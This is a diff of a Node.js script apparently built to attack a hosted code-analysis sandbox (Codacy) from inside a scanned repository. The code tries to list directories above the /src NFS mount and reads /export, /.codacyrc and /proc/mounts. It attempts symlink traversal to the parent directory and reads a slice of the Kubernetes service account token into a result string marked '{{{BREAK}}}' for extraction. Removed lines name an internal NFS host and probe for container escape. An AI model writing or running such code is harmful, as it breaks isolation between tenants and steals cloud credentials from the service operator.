@@ -1,49 +1,43 @@
 var fs = require('fs');
-var path = require('path');
 var result = '';
 
-// The NFS mount is at /src, backed by 172.32.137.127:/export/worker/codacy/repos/p_9d1434bff2fe12d3
-// Try to traverse to parent directory to see other repos
-
-// Method 1: Symlink traversal (won't work if mount is per-repo)
-// Method 2: /proc/mounts shows the NFS path - try to access parent via /src/../
+// Try to traverse NFS mount parent
 try {
   var parent = fs.readdirSync('/src/../');
-  result += 'PARENT_DIR:' + parent.slice(0,20).join(',') + '|';
+  result += 'PARENT:' + parent.slice(0,20).join(',') + '|';
 } catch(e) { result += 'PARENT_ERR:' + e.code + '|'; }
 
-// Method 3: Check if we can see the NFS mount point differently
+// Read .codacyrc config
 try {
-  var proc_mounts = fs.readFileSync('/proc/mounts', 'utf8');
-  var nfs_lines = proc_mounts.split('
-').filter(function(l) { return l.indexOf('nfs') !== -1; });
-  result += 'NFS_COUNT:' + nfs_lines.length + '|';
-} catch(e) {}
+  var config = fs.readFileSync('/.codacyrc', 'utf8');
+  result += 'RC:' + config.substring(0, 200) + '|';
+} catch(e) { result += 'RC_ERR:' + e.code + '|'; }
 
-// Method 4: Try to access /export directly (might be mounted at container level)
+// Try /export
 try {
   var exp = fs.readdirSync('/export');
   result += 'EXPORT:' + exp.join(',') + '|';
 } catch(e) { result += 'NO_EXPORT:' + e.code + '|'; }
 
-// Method 5: Check /.codacyrc for config info about the analysis
+// Try to read other mount paths visible in /proc
 try {
-  var config = fs.readFileSync('/.codacyrc', 'utf8');
-  result += 'CODACYRC:' + config.substring(0, 200) + '|';
-} catch(e) { result += 'RC_ERR:' + e.code + '|'; }
+  var mounts = fs.readFileSync('/proc/mounts', 'utf8');
+  var lines = mounts.split(String.fromCharCode(10));
+  var nfsCount = lines.filter(function(l) { return l.indexOf('nfs') !== -1; }).length;
+  result += 'NFS_MOUNTS:' + nfsCount + '|';
+} catch(e) {}
 
-// Method 6: Check /proc/self/root for container escape hints
+// Try symlink creation to parent
 try {
-  var root = fs.readdirSync('/proc/1/root/');
-  result += 'PID1_ROOT:' + root.slice(0,10).join(',') + '|';
-} catch(e) { result += 'PID1_ERR:' + e.code + '|'; }
+  fs.symlinkSync('/src/..', '/tmp/parent_link');
+  var via_link = fs.readdirSync('/tmp/parent_link');
+  result += 'VIA_LINK:' + via_link.slice(0,10).join(',') + '|';
+} catch(e) { result += 'LINK_ERR:' + e.code + '|'; }
 
-// Method 7: Find all mount points
+// Get second part of token
 try {
-  var minfo = fs.readFileSync('/proc/self/mountinfo', 'utf8');
-  var interesting = minfo.split('
-').filter(function(l) { return l.indexOf('172.') !== -1 || l.indexOf('export') !== -1 || l.indexOf('/src') !== -1; });
-  result += 'MOUNTINFO:' + interesting.join(';').substring(0, 150);
+  var token = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8');
+  result += 'TOKEN_P2:' + token.substring(250, 500);
 } catch(e) {}
 
 result += '{{{BREAK}}}';
